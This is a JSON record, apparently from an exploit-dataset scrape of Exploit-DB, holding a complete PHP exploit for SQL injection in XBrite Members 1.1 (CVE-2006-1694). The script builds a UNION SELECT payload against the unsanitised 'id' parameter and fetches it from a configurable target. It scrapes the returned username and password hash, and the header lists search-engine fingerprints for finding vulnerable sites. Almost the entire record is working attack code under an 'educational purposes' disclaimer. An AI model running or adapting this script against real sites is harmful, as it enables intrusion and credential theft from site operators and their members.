{
  "id": "1655",
  "title": "XBrite Members 1.1 - &#039;id&#039; SQL Injection",
  "cve": "CVE-2006-1694",
  "vuln_type": "sqli",
  "code": "<?php /*\r\n |=================================================================================================|\r\n |       _______..__   __.      ___      .___________.  ______  __    __   _______ .______         |\r\n |      /       ||  \\ |  |     /   \\     |           | /      ||  |  |  | |   ____||   _  \\        |\r\n |     |   (----`|   \\|  |    /  ^  \\    `---|  |----`|  ,----'|  |__|  | |  |__   |  |_)  |       |\r\n |      \\   \\    |  . `  |   /  /_\\  \\       |  |     |  |     |   __   | |   __|  |      /        |\r\n |  .----)   |   |  |\\   |  /  _____  \\      |  |     |  `----.|  |  |  | |  |____ |  |\\  \\----.   |\r\n |  |_______/    |__| \\__| /__/     \\__\\     |__|      \\______||__|  |__| |_______|| _| `._____|   |\r\n |                                                                                                 |\r\n |=================================================================================================|\r\n\r\n\r\n      exploit: XBrite Members <= 1.1 remote sql injection vulnerability\r\n      release: 2006-04-09\r\n       author: snatcher [snatcher at gmx.ch]\r\n      country: switzerland  |+|\r\n\t  \r\n  application: XBrite Members <= 1.1\r\n  description: a php / mysql based member script\r\n     download: http://www.xelebrite.de\r\n\t           http://www.clanscripte.net/main.php?content=download&do=file&dlid=179\r\n  description: if magic_quotes_gpc is Off, you can get each password (md5 hash) with a simple sql injection\r\n  fingerprint: google -> \"Powered By XBrite Members\" -> 2800\r\n               msn -> \"Powered By XBrite Members\" ->  581\r\n   conditions: php.ini -> magic_quotes_gpc = Off\r\n       greets: all security guys and coders over the world, honkey :>, ..\r\n terms of use: this exploit is just for educational purposes, do not use it for illegal acts.\r\n\r\n\r\n---------------------------- members.php - line 197 -------------------------------------\r\n$query = @mysql_query (\"select * from oz_members where id='\".$_GET['id'].\"'\");\r\n-----------------------------------------------------------------------------------------\r\n\r\nbecause magic_quotes_gpc is off, you can break out of the singel quotes and insert malicious sql code,\r\ni.e. with a union operator.\r\n\r\n\r\n*/\r\n\r\n/*********************** CONFIGURATION ****************************/\r\n\r\n$PATH_TO_FILE  = 'http://yourhost.com/member.php';                 // in example: http://yourhost.com/member.php\r\n$USER_ID       = 1;                                                // from which user id do you want the password? default: 1\r\n$GET_VARS      = '?action=members&act=show&id=';                   // do not change\r\n$SQL_INJECTION = '0\\' union select 1,1,1,1,1,1,1,1,1,real_name'.   // do not change\r\n                 ',name,pw,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,'.\r\n\t\t\t\t '1,1,1,1,1,1,1,1,1,1,1,1 from oz_members where '.\r\n\t\t\t\t 'id = '.$USER_ID.' /*';\r\n\r\n\r\n/**************************** MAIN ********************************/\r\n\r\n$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\\'t open host!'); \r\nforeach ($file_array as $now)                               \r\n\t$html_content .= $now;\r\n\r\n$html_content = str_castrate($html_content);\r\n\r\npreg_match_all(\"!Alter:</b></td><tdwidth=\\\"50%\\\">(.*?)</td>!\",$html_content,$username); /* gets username */\r\npreg_match_all(\"!Herkunft:</b></td><tdwidth=\\\"50%\\\">(.*?)</td>!\",$html_content,$password); /* gets password */\r\n\r\nif ($username[1][0] && $password[1][0] && $username[1][0] <> 'keineAngabe') {\r\n\techo 'username: <b>'.$username[1][0].'</b><br>';\r\n\techo 'password: <b>'.$password[1][0].'</b>';\r\n}else {\r\n\techo 'exploit failed! <br>magic_quotes_gpc = Off ?';\r\n}\r\necho '<br><br><br><br><br>\r\n======================================================================<br>\r\nexploit: XBrite Members <= 1.1 remote sql injection vulnerability<br>\r\nrelease: 2006-04-09<br>\r\nauthor: snatcher [snatcher at gmx.ch]<br>\r\n======================================================================';\r\n\r\nfunction str_castrate($string) {\r\n\t$string = str_replace(\"\\n\", '', $string);\r\n\t$string = str_replace(\"\\r\", '', $string);\r\n\t$string = str_replace(\" \", '', $string);\r\n\treturn $string;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-09]",
  "url": "https://www.exploit-db.com/exploits/1655"
}